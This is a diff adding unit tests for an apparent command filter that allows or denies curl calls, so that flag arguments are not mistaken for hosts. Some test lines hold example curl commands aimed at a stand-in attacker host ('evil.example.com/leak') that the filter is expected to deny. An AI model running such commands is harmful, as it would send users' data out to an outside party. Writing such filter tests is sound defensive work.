@@ -44,3 +44,17 @@ def test_defensive_instructions_present():
     txt = Path("app/initial_workspace_default/CLAUDE.md").read_text()
     for phrase in ("environment variable", "hook", "enumerate"):
         assert phrase in txt.lower()
+
+
+def test_curl_flag_value_not_treated_as_host():
+    """A dotted flag-argument (e.g. --output results.example.csv) must not be
+    misread as a bare host and denied when the real target is allowlisted."""
+    assert _decide("curl --output results.example.csv https://api.github.com/data") == "allow"
+    assert _decide("curl -o out.data.csv https://api.github.com/x") == "allow"
+
+
+def test_curl_flag_value_does_not_mask_a_real_bad_host():
+    """Skipping the flag value must NOT let the real target slip through:
+    the bare host after the consumed value is still checked."""
+    assert _decide("curl -o out.csv evil.example.com") == "deny"
+    assert _decide("curl --output x.csv https://evil.example.com/leak") == "deny"
